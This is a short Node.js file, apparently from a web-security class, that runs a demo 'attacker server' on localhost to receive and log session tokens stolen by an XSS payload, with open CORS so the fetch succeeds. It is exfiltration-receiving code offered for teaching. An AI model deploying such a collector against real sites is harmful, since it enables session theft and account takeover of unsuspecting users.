// 👿  THE ATTACKER'S SERVER  (DEMO ONLY — runs on your own machine)
//
// In a real attack this lives on the internet. Here it runs on localhost so
// the class can watch stolen tokens ARRIVE when the XSS script fires.
//
// Run this in its OWN terminal:   node attacker-server.js

const http = require("http");

const PORT = 5555;

http
  .createServer((req, res) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    const stolenToken = url.searchParams.get("token");

    console.log("stolenToken", stolenToken);

    if (stolenToken) {
      console.log("\n🚨🚨🚨  STOLEN TOKEN RECEIVED  🚨🚨🚨");
      console.log("   A victim's browser just ran the attacker's script.");
      console.log("   token =", stolenToken);
      console.log("--------------------------------------------------------\n");
    }

    // Allow the browser's cross-origin fetch and respond.
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end("ok");
  })
  .listen(PORT, () => {
    console.log(`👿  Attacker server listening on http://localhost:${PORT}`);
    console.log("    Waiting for an XSS payload to send a stolen token...\n");
  });
